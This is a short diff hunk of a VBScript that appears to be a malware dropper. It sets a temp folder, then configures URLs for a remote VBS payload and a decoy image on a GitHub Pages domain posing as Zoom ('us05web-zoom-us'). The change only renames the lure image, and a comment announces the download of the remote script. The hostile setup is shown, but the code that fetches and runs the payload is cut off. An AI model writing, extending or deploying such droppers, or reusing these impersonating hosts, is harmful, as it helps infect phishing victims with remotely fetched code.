@@ -7,7 +7,7 @@ tempFolder = objFSO.GetSpecialFolder(2)
 
 ' ---------- CONFIGURE THESE URLS ----------
 remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/agta.vbs"
-remoteImage_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/notary_id.jpg"
+remoteImage_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/17561724041232212858723659618913.jpg"
 ' ------------------------------------------
 
 ' 1. Download the remote VBS
